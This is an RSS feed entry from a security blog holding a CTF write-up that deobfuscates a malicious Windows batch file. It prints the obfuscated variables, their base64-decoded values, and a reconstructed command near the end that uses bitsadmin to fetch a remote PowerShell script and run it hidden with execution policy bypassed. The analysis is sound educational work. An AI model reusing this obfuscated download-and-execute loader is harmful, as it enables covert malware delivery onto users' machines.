@@ -1,0 +1,1057 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Deobfuscation on n3rr</title><link>https://n3rr.github.io/tags/deobfuscation/</link><description>Recent content in Deobfuscation on n3rr</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 25 Aug 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://n3rr.github.io/tags/deobfuscation/index.xml" rel="self" type="application/rss+xml"/><item><title>Malcore Challenge</title><link>https://n3rr.github.io/p/malcore-chall/</link><pubDate>Sun, 25 Aug 2024 00:00:00 +0000</pubDate><guid>https://n3rr.github.io/p/malcore-chall/</guid><description>&lt;img src="https://n3rr.github.io/p/malcore-chall/image1.png" alt="Featured image of post Malcore Challenge" />&lt;h1 id="brief-introduction">Brief Introduction
+&lt;/h1>&lt;p>&lt;img src="https://n3rr.github.io/p/malcore-chall/image2.png"
+width="768"
+height="45"
+srcset="https://n3rr.github.io/p/malcore-chall/image2_hu16693845309559041861.png 480w, https://n3rr.github.io/p/malcore-chall/image2_hu1794457603272987238.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="1706"
+data-flex-basis="4096px"
+>&lt;/p>
+&lt;p>Given was a &lt;a class="link" href="https://www.techtarget.com/searchwindowsserver/definition/batch-file" target="_blank" rel="noopener"
+>batch&lt;/a> file. Analysing the file suggested that the script defines several variables with obfuscated names and encoded values. It uses Base64 encoding and other forms of obfuscation to hide the actual commands being executed. The script uses PowerShell to decode Base64 encoded strings and convert them into executable commands. It then constructs and runs commands based on the decoded values.&lt;/p>
+&lt;h1 id="variable-obfuscation">Variable Obfuscation
+&lt;/h1>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="k">set&lt;/span> &lt;span class="nv">eitg&lt;/span>&lt;span class="p">=&lt;/span>set
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">%eitg%&lt;/span> gopy=for
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">%eitg%&lt;/span> hetY=&lt;span class="s2">&amp;#34;tokens=* delims=&amp;#34;&lt;/span> &lt;span class="p">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">%eitg%&lt;/span> GhEt=in &lt;span class="p">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">%eitg%&lt;/span> SADFCweFDCWQE=/f
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Above are the variable declaration made in the script. As we can see &lt;code>eitg&lt;/code> is declared as &lt;code>set&lt;/code>. So every time that variable is called using &lt;code>%eitg%&lt;/code> , it will run the command &lt;code>set&lt;/code>.&lt;/p>
+&lt;h1 id="main-operation">Main Operation
+&lt;/h1>&lt;p>Below are the obfuscated functions that play a crucial role in the scripts. Understanding how the variable declared from the section before, we can construct a more readble functions.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">%gopy%&lt;/span> &lt;span class="nv">%SADFCweFDCWQE%&lt;/span> &lt;span class="nv">%hetY%&lt;/span> &lt;span class="se">%%&lt;/span># &lt;span class="nv">%GhEt%&lt;/span> (&amp;#39;powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%OYUIThbgrwtWCVRE%&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="se">^)^)&lt;/span>&amp;#39;) do &lt;span class="nv">%eitg%&lt;/span> &lt;span class="s2">&amp;#34;CVWQeFEWRFQWEd=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">%gopy%&lt;/span> &lt;span class="nv">%SADFCweFDCWQE%&lt;/span> &lt;span class="nv">%hetY%&lt;/span> &lt;span class="se">%%&lt;/span># &lt;span class="nv">%GhEt%&lt;/span> (&amp;#39;&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span> [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%DwqeqwefWEFqwer%&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="se">^)^)&lt;/span>&amp;#39;) do &lt;span class="nv">%eitg%&lt;/span> &lt;span class="s2">&amp;#34;WreqwecQWEFRWE=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">%gopy%&lt;/span> &lt;span class="nv">%SADFCweFDCWQE%&lt;/span> &lt;span class="nv">%hetY%&lt;/span> &lt;span class="se">%%&lt;/span># &lt;span class="nv">%GhEt%&lt;/span> (&amp;#39;&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span> &lt;span class="nv">%WreqwecQWEFRWE%&lt;/span>(&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%QWErfqwfecQWEDWEX%&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="se">^)^)&lt;/span>&amp;#39;) do &lt;span class="nv">%eitg%&lt;/span> &lt;span class="s2">&amp;#34;KIUYntyERverERF=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">%gopy%&lt;/span> &lt;span class="nv">%SADFCweFDCWQE%&lt;/span> &lt;span class="nv">%hetY%&lt;/span> &lt;span class="se">%%&lt;/span># &lt;span class="nv">%GhEt%&lt;/span> (&amp;#39;&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span> &lt;span class="nv">%WreqwecQWEFRWE%&lt;/span>(&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%QWEcwgrtHWTFWEQaxwe%&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="se">^)^)&lt;/span>&amp;#39;) do &lt;span class="nv">%eitg%&lt;/span> &lt;span class="s2">&amp;#34;NbfdsvREVntySRE=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">%gopy%&lt;/span> &lt;span class="nv">%SADFCweFDCWQE%&lt;/span> &lt;span class="nv">%hetY%&lt;/span> &lt;span class="se">%%&lt;/span># &lt;span class="nv">%GhEt%&lt;/span> (&amp;#39;&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span> &lt;span class="nv">%WreqwecQWEFRWE%&lt;/span>(&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%RTYUvERQCXergtewsr%&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="se">^)^)&lt;/span>&amp;#39;) do &lt;span class="nv">%eitg%&lt;/span> &lt;span class="s2">&amp;#34;iUYTbyteVERTfer=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">%gopy%&lt;/span> &lt;span class="nv">%SADFCweFDCWQE%&lt;/span> &lt;span class="nv">%hetY%&lt;/span> &lt;span class="se">%%&lt;/span># &lt;span class="nv">%GhEt%&lt;/span> (&amp;#39;&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span> &lt;span class="nv">%WreqwecQWEFRWE%&lt;/span>(&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%NETRYverEWERCREWweq%&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="se">^)^)&lt;/span>&amp;#39;) do &lt;span class="nv">%eitg%&lt;/span> &lt;span class="s2">&amp;#34;QWWEcdweWERee=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">%gopy%&lt;/span> &lt;span class="nv">%SADFCweFDCWQE%&lt;/span> &lt;span class="nv">%hetY%&lt;/span> &lt;span class="se">%%&lt;/span># &lt;span class="nv">%GhEt%&lt;/span> (&amp;#39;&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span> &lt;span class="nv">%WreqwecQWEFRWE%&lt;/span>(&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%ERTYbrtWCRWEfverwfcwer%&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="se">^)^)&lt;/span>&amp;#39;) do &lt;span class="nv">%eitg%&lt;/span> &lt;span class="s2">&amp;#34;QWERfcerWEDfcvtbytTYR=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Deobfuscated functions are as below:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="k">/f&lt;/span> tokens=* delims= &lt;span class="se">%%&lt;/span># &lt;span class="k">in&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%OYUIThbgrwtWCVRE%&lt;/span>&lt;span class="s1">&amp;#34;&amp;#34;&amp;#34;^)^)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="k">set&lt;/span> &lt;span class="s2">&amp;#34;CVWQeFEWRFQWEd=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="k">/f&lt;/span> tokens=* delims= &lt;span class="se">%%&lt;/span># &lt;span class="k">in&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span>&lt;span class="s1"> [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%DwqeqwefWEFqwer%&lt;/span>&lt;span class="s1">&amp;#34;&amp;#34;&amp;#34;^)^)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="k">set&lt;/span> &lt;span class="s2">&amp;#34;WreqwecQWEFRWE=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="k">/f&lt;/span> tokens=* delims= &lt;span class="se">%%&lt;/span># &lt;span class="k">in&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span>&lt;span class="s1"> &lt;/span>&lt;span class="nv">%WreqwecQWEFRWE%&lt;/span>&lt;span class="s1">(&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%QWErfqwfecQWEDWEX%&lt;/span>&lt;span class="s1">&amp;#34;&amp;#34;&amp;#34;^)^)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="k">set&lt;/span> &lt;span class="s2">&amp;#34;KIUYntyERverERF=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="k">/f&lt;/span> tokens=* delims= &lt;span class="se">%%&lt;/span># &lt;span class="k">in&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span>&lt;span class="s1"> &lt;/span>&lt;span class="nv">%WreqwecQWEFRWE%&lt;/span>&lt;span class="s1">(&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%QWEcwgrtHWTFWEQaxwe%&lt;/span>&lt;span class="s1">&amp;#34;&amp;#34;&amp;#34;^)^)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="k">set&lt;/span> &lt;span class="s2">&amp;#34;NbfdsvREVntySRE=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="k">/f&lt;/span> tokens=* delims= &lt;span class="se">%%&lt;/span># &lt;span class="k">in&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span>&lt;span class="s1"> &lt;/span>&lt;span class="nv">%WreqwecQWEFRWE%&lt;/span>&lt;span class="s1">(&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%RTYUvERQCXergtewsr%&lt;/span>&lt;span class="s1">&amp;#34;&amp;#34;&amp;#34;^)^)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="k">set&lt;/span> &lt;span class="s2">&amp;#34;iUYTbyteVERTfer=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="k">/f&lt;/span> tokens=* delims= &lt;span class="se">%%&lt;/span># &lt;span class="k">in&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span>&lt;span class="s1"> &lt;/span>&lt;span class="nv">%WreqwecQWEFRWE%&lt;/span>&lt;span class="s1">(&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%NETRYverEWERCREWweq%&lt;/span>&lt;span class="s1">&amp;#34;&amp;#34;&amp;#34;^)^)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="k">set&lt;/span> &lt;span class="s2">&amp;#34;QWWEcdweWERee=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="k">/f&lt;/span> tokens=* delims= &lt;span class="se">%%&lt;/span># &lt;span class="k">in&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span>&lt;span class="s1"> &lt;/span>&lt;span class="nv">%WreqwecQWEFRWE%&lt;/span>&lt;span class="s1">(&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="nv">%ERTYbrtWCRWEfverwfcwer%&lt;/span>&lt;span class="s1">&amp;#34;&amp;#34;&amp;#34;^)^)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="k">set&lt;/span> &lt;span class="s2">&amp;#34;QWERfcerWEDfcvtbytTYR=&lt;/span>&lt;span class="se">%%&lt;/span>&lt;span class="s2">#&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Ah, much better. But there are still an encoded value we need to decode. As seen in the first line above, there was a powershell command executing a base64 conversion. The variable inside the &lt;strong>FromBase64String()&lt;/strong> function points to the encoded value somewhere in script.&lt;/p>
+&lt;h1 id="decoding-values">Decoding Values
+&lt;/h1>&lt;p>I tried to use &lt;strong>base64dump.py&lt;/strong> but somehow it does not detect those strings as a base64 encoding.&lt;/p>
+&lt;p>Below are the variables and its decoded values:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl"># this is kinda of pointless
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FWEfvrewFWRVEwer=dG#######hpc##########yB#####pc##########yBraW5k#####Y#######SBv######Zi######Bwb2l##########ud#######Gx#####lc#########3M######K######
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># Flying saucers often cross my mind when I&amp;#39;m high I&amp;#39;m trippin&amp;#39;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">POUINTYEBRTwertf=R!!!!!!m!!!!!!!!!x5aW5n!!!!!!!IHNh!!!!!!!!!dWNl!!!!!!!!!c!!!!!!!!n!!!!!!!!!Mg!!!!!!!!!!b2Z!!!!!!!!!0ZW4gY3!!!!!!!!!J!!!!!!!vc3Mg!!!!!!!bXkgbWlu!!!!!!Z!!!!!!!!!C!!!!!!B!!!!!!3!!!!!!!!aGV!!!!!!uI!!!!!!!EknbSBoa!!!!!!!Wdo!!!!!!!!!IEk!!!!!!!!n!!!!!!!!bSB0!!!!!!cmlwcGl!!!!!!!uJ!!!!!!w!!!!!o=!!!!!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># stacy.ps1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WeTTyhRRvfer=c@@@@@@3R@@@@h@@@@@@@@@Y3k@@@ucH@@@@@@@M@@@xCg@@@==@@@@@@@
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># https://raw.githubusercontent.com/Internet-2-0/file-samples/master/scripts/powershell/stacy.ps1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">VerBrtEwFCWe=a!!!!!!H!!!!!R0c!!!!!HM!!!!!!!!!6!!!!!!!!!L!!!!!y!!!!!9!!!!!y!!!!!!!!!!YXc!!!!!!!uZ2!!!!!l0aHVi!!!!!!!!!d!!!!!!!!!!X!!!!!!!!NlcmNvb!!!!!!!!!n!!!!!!!!RlbnQu!!!!!!!!!!Y29tL!!!!!!!0ludG!!!!!!!!!!Vyb!!!!!!m!!!!!!V!!!!!!0LTItM!!!!!!!C!!!!!!!9m!!!!!!a!!!!!!!W!!!!!!!!!!xl!!!!!!!!!!L!!!!!!!X!!!!!N!!!!!h!!!!!!!!bX!!!!!!!!!!B!!!!!!!s!!!!!!!!!!Z!!!!!XMvbWF!!!!!!z!!!!!!!!!!d!!!!!!!!GV!!!!!!!!!!y!!!!!!!!!!L3N!!!!!!jcm!!!!!!!!!!lwdHMvc!!!!!G!!!!!!!!!!9!!!!!!!!3ZXJzaG!!!!!!!!V!!!!!!!!!sbC9z!!!!!!!!!!d!!!!!!!GFjeS5wc!!!!!!zE!!!!!!K!!!!!!!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WERtggbvtrWERV=W1N5c!!!!!!!!!!3!!!!!!!!!Rlb!!!!!S5UZXh0LkVuY29ka!!!!!W5!!!!!!nX!!!!!!!!!!To6!!!!!V!!!!!V!!!!!!!!RG!!!!!!!!!!O!!!!!!!!!C5HZXR!!!!!!T!!!!!!!!!!d!!!!!H!!!!!!!Jp!!!!!!!!!!b!!!!!!!!mcoW1N!!!!!!!!5!!!!!c3RlbS5D!!!!!!!!b!!!!!!!25!!!!!!!2!!!!!!ZXJ!!!!!!!0XTo6Rn!!!!!!!!!J!!!!!!!!!!v!!!!!!!!!!bUJh!!!!!!c!!!!!2!!!!!!U2!!!!!!!!!NFN!!!!!!!!!!0!!!!!!!!!cmluZw!!!!!!!!!!o=
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># bitsadmin.exe /transfer
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NTYerFVERHetERfewef=Y@@@@@@ml0c2Fk@@@@@@@b@@@@@@@@@WluLmV4@@@@@@@@@ZS@@@@@@A@@@@@@v@@@@@@@@@d@@@@@@@HJh@@@@@@bnNmZXI@@@@@@@@K@@@@@@@@@@
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># 2795e16d0061f24c913c2602c24535cac20247c25c9c36a89d20ad4820bc4b72 groups.json
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># 8cb1fe0e9a428f1a3ffa79763e9a0b58175af886ff3bf91f310f48dd8a2a638d pretty_groups.json
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BRTwercvWQEFRWE=Mjc!!!!!!!!5!!!!!!!NWUx!!!!!!Nm!!!!!!!!!!Q!!!!!wM!!!!!!!DYx!!!!!!!ZjI0!!!!!!!!Yzkx!!!!!!M2My!!!!!NjAyY!!!!!!!!zI0NTM1Y!!!!!!!!!2F!!!!!!j!!!!!!!Mj!!!!!!!!!A!!!!!!!!!!yND!!!!!!!d!!!!!!!!!j!!!!!!!Mj!!!!!!!!Vj!!!!!!!OWM!!!!!!zNmE4!!!!!!!!!!O!!!!!WQyM!!!!!!!!!!GFk!!!!!!!!!NDgy!!!!!!!!!MGJj!!!!!!!!!NGI3M!!!!!i!!!!!!A!!!!!!!!!!gZ3Jv!!!!!!dX!!!!!!!BzLmpzb2!!!!!!!!4KOG!!!!!!!!!!NiMW!!!!!Zl!!!!!!!!M!!!!!!!!!GU!!!!!!!!!5YTQ!!!!!!yOGYxY!!!!!!!!!!TN!!!!!!!!!m!!!!!!!!!!ZmE!!!!!!3O!!!!!!T!!!!!!!!!c2!!!!!!!!!M2!!!!!!U5Y!!!!!!!TBi!!!!!!!!!!NTg!!!!!!!x!!!!!N!!!!!!!!!zV!!!!!!!!!h!!!!!!Z!!!!!j!!!!!!g!!!!!!!!!4NmZmM!!!!!!!!!!2!!!!!!!!!!J!!!!!mO!!!!!TFm!!!!!!!!!!Mz!!!!!!!Ew!!!!!!Z!!!!!jQ4ZGQ!!!!!!!!!4Y!!!!!TJ!!!!!hNj!!!!!!!!!M4ZC!!!!!AgcH!!!!!!!!J!!!!!!!l!!!!!dHR5X2!!!!!!!!!dyb3Vwcy!!!!!!!!!5qc29u!!!!!!!Cg!!!!!!!!!=!!!!!!!!!=!!!!!!!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># -NoP -wiNdowSTYLE hiddeN -ExEcuTioNPolicy BypAss -CoMmAND
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RTYbrtgVEWRqqwer=LU5vUC@@@@@@At@@@@@@@@@d@@@@@2l@@@@@@@@@@O@@@@@@@ZG93@@@@@@U@@@@@@@@1@@@@@RZTE
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h1 id="reconstructing-full-command">Reconstructing Full Command
+&lt;/h1>&lt;p>The very last line of the script suggest that the full command being constructed and executed.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">%QWERfcerWEDfcvtbytTYR%&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%iUYTbyteVERTfer%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="nv">%KIUYntyERverERF%&lt;/span> &lt;span class="nv">%cd%&lt;/span>\&lt;span class="nv">%NbfdsvREVntySRE%&lt;/span> &lt;span class="p">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">%CVWQeFEWRFQWEd%&lt;/span> &lt;span class="nv">%QWWEcdweWERee%&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">%cd%&lt;/span>&lt;span class="s2">\&lt;/span>&lt;span class="nv">%NbfdsvREVntySRE%&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Using the same techniques from the sections before to reconstruct the command executed by this batch file.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">bitsadmin.exe /transfer &lt;span class="s2">&amp;#34;f48920e537d9c4e0e795971da3646444190eecd24d719303becdd9a13bfa5810&amp;#34;&lt;/span> https://raw.githubusercontent.com/Internet-2-0/file-samples/master/scripts/powershell/stacy.ps1 C:\path\to\stacy.ps1 &lt;span class="p">&amp;amp;&amp;amp;&lt;/span> powershell.exe -NoP -wiNdowSTYLE hiddeN -ExEcuTioNPolicy BypAss -CoMmAND &lt;span class="s2">&amp;#34;C:\path\to\stacy.ps1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
